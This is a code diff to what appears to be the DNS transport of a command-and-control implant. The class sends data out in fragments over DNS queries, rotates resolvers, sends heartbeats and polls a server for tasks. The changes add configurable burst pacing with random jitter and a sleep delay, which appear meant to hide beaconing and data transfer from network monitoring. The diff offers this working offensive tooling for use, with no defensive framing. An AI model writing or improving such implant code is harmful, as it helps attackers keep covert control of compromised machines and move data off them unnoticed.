@@ -480,6 +480,25 @@ void ConnectorDNS::UpdateResolvers(BYTE* resolvers)
     ParseResolvers((CHAR*)resolvers);
 }
 
+void ConnectorDNS::UpdateBurstConfig(ULONG enabled, ULONG sleepMs, ULONG jitterPct)
+{
+    this->profile.burst_enabled = enabled;
+    this->profile.burst_sleep = sleepMs;
+    this->profile.burst_jitter = jitterPct;
+}
+
+void ConnectorDNS::GetBurstConfig(ULONG* enabled, ULONG* sleepMs, ULONG* jitterPct)
+{
+    if (enabled) *enabled = this->profile.burst_enabled;
+    if (sleepMs) *sleepMs = this->profile.burst_sleep;
+    if (jitterPct) *jitterPct = this->profile.burst_jitter;
+}
+
+void ConnectorDNS::UpdateSleepDelay(ULONG sleepSeconds)
+{
+    this->sleepDelaySeconds = sleepSeconds;
+}
+
 BOOL ConnectorDNS::QueryWithRotation(const CHAR* qname, const CHAR* qtypeStr, 
                                       BYTE* outBuf, ULONG outBufSize, ULONG* outSize)
 {
@@ -799,8 +818,23 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
                 offset = sendOffset + chunk;
             }
 
-            ULONG pacing = 30 + (this->functions->GetTickCount() % 20);
-            this->functions->Sleep(pacing);
+            // Inter-fragment pacing
+            if (this->profile.burst_enabled && this->profile.burst_sleep > 0) {
+                // Burst ON: use burst_sleep (milliseconds)
+                ULONG pacing = this->profile.burst_sleep;
+                ULONG jitterPct = this->profile.burst_jitter;
+                if (jitterPct > 0 && jitterPct <= 90) {
+                    ULONG jitterRange = (pacing * jitterPct) / 100;
+                    ULONG jitterDelta = this->functions->GetTickCount() % (jitterRange + 1);
+                    pacing = pacing - (jitterRange / 2) + jitterDelta;
+                    if (pacing < 10) pacing = 10;
+                }
+                this->functions->Sleep(pacing);
+            } else if (this->sleepDelaySeconds > 0) {
+                // Burst OFF: use sleep_delay (seconds -> milliseconds)
+                ULONG pacing = this->sleepDelaySeconds * 1000;
+                this->functions->Sleep(pacing);
+            }
         }
 
         if (uploadComplete || offset >= total) {
@@ -853,9 +887,9 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
     }
 
     // Send heartbeat if no pending download
-    if (!this->forcePoll && !this->downBuf && !this->hasPendingTasks && this->qtype[0] == 'T') {
+    if (!this->forcePoll && !this->downBuf && this->qtype[0] == 'T') {
         SendHeartbeat();
-                return;
+        return;
     }
 
     if (this->forcePoll) {
@@ -885,8 +919,12 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
     if (QueryWithRotation(qname, this->qtype, respBuf, sizeof(respBuf), &respSize) && respSize > 0) {
         this->lastQueryOk = TRUE;
 
-        if (respSize == 2 && respBuf[0] == 'O' && respBuf[1] == 'K')
+        // Check for "no data" response: "OK" or empty/small response
+        if ((respSize == 2 && respBuf[0] == 'O' && respBuf[1] == 'K') || 
+            (respSize <= 4)) {
+            this->hasPendingTasks = FALSE;  // Reset flag when server says "no data"
             return;
+        }
 
         BYTE binBuf[1024];
         int binLen = DnsCodec::Base64Decode((const CHAR*)respBuf, respSize, binBuf, sizeof(binBuf));
